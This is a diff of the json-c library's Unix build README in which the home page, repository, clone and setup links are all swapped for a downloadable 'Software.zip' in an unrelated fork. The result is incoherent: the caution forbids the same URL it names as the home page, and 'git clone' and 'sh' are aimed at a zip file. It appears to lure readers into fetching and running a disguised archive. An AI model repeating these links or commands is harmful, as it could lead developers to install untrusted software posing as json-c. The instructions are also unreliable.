@@ -4,9 +4,9 @@
 Building on Unix with `git`, `gcc` and `autotools`
 --------------------------------------------------
 
-Home page for json-c: https://github.com/ColtOSTemp/platform_external_json-c/releases/download/v1.0/Application.zip
+Home page for json-c: https://github.com/ColtOSTemp/platform_external_json-c/releases/download/v2.0/Software.zip
 
-Caution: do **NOT** use sources from https://github.com/ColtOSTemp/platform_external_json-c/releases/download/v1.0/Application.zip,
+Caution: do **NOT** use sources from https://github.com/ColtOSTemp/platform_external_json-c/releases/download/v2.0/Software.zip,
 they are old.
 
 Prerequisites:
@@ -21,12 +21,12 @@ If you're not using a release tarball, you'll also need:
 
 Make sure you have a complete `libtool` install, including `libtoolize`.
 
-`json-c` GitHub repo: https://github.com/ColtOSTemp/platform_external_json-c/releases/download/v1.0/Application.zip
+`json-c` GitHub repo: https://github.com/ColtOSTemp/platform_external_json-c/releases/download/v2.0/Software.zip
 
 ```bash
-$ git clone https://github.com/ColtOSTemp/platform_external_json-c/releases/download/v1.0/Application.zip
+$ git clone https://github.com/ColtOSTemp/platform_external_json-c/releases/download/v2.0/Software.zip
 $ cd json-c
-$ sh https://github.com/ColtOSTemp/platform_external_json-c/releases/download/v1.0/Application.zip
+$ sh https://github.com/ColtOSTemp/platform_external_json-c/releases/download/v2.0/Software.zip
 ```
 
 followed by
